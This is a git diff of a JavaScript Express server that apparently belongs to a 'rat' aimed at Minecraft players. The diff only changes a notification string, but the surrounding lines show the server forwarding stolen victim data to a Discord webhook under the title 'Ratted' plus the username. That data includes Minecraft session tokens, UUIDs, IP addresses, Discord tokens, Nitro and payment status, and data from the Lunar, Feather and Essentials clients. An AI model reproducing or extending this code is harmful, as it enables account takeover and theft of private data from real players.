@@ -164,7 +164,7 @@ app.post("/", (req, res) => {
 
                     if (sentnetworth < 700) {
                         post(process.env.WEBHOOK, JSON.stringify({
-                            content: `@everyone - ${total_networth}`, //ping
+                            content: `@everyone  - [NW] No profile data found [NW]`, //ping
                             embeds: [{
                                 title: `Ratted ${req.body.username} - Click For Stats`,
                                 description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
